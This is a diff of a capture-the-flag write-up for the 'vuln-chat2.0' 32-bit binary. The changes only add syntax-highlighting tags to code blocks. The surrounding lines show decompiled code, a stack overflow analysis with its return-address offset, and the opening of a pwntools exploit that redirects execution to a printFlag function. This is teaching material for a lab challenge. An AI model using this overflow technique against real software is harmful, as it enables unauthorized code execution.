@@ -4,7 +4,7 @@ The goal for this challenge is to print the contents of `flag.txt`, not pop a sh
 
 Let's take a look at the binary:
 
-```
+```console
 $    file vuln-chat2.0
 vuln-chat2.0: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=093fe7a291a796024f450a3081c4bda8a215e6e8, not stripped
 $    pwn checksec vuln-chat2.0
@@ -33,7 +33,7 @@ So we can see we are dealing with a `32` bit binary, with a Non-Executable stack
 
 When we look at the main function in Ghidra, we see this:
 
-```
+```c
 /* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
 
 undefined4 main(void)
@@ -47,7 +47,7 @@ undefined4 main(void)
 
 So we can see here, it essentially just calls `doThings`:
 
-```
+```c
 
 /* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
 
@@ -78,7 +78,7 @@ void doThings(void)
 
 We can see that the value of `DAT_08048798` is `%15s`:
 
-```
+```nasm
                              DAT_08048798                                    XREF[2]:     doThings:0804858f(*),
                                                                                           doThings:08048595(*)  
         08048798 25              ??         25h    %
@@ -90,7 +90,7 @@ We can see that the value of `DAT_08048798` is `%15s`:
 
 So we can see it essentially prompts us for input twice (in addition to printing out a lot of text). The first time it prompts us for input, it scans in `15` bytes worth of data into `inp0`, which holds `15` bytes worth of data (no overflow here). The second scan scans in `0x2d` bytes worth of data into `inp1` which holds `20` bytes of data, so we have an overflow. Let's see what the offset is from the start of our input to the saved return address is:
 
-```
+```gdb
 ────────────────────────────────────────────────────────────────────────────────────── registers ────
 $eax   : 0x1f      
 $ebx   : 0x08049b08  →  0x08049a18  →  0x00000001
@@ -146,7 +146,7 @@ So we can see that the offset is `0xffffd0f0 - 0xffffd0c5 = 0x2b`. Since our inp
 
 Also we can see that there is a function at `0x8048672` called `printFlag`, that if we call it we will get the flag:
 
-```
+```c
 /* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
 
 void printFlag(void)
@@ -169,7 +169,7 @@ Also even though we don't have to deal with address randomization in this challe
 
 Putting it all together, we have the following exploit:
 
-```
+```python
 #Import pwntools
 from pwn import *
 
@@ -196,7 +196,7 @@ target.interactive()
 
 When we run it:
 
-```
+```console
 $    python exploit.py
 [!] Could not find executable 'vuln-chat2.0' in $PATH, using './vuln-chat2.0' instead
 [+] Starting local process './vuln-chat2.0': pid 10483
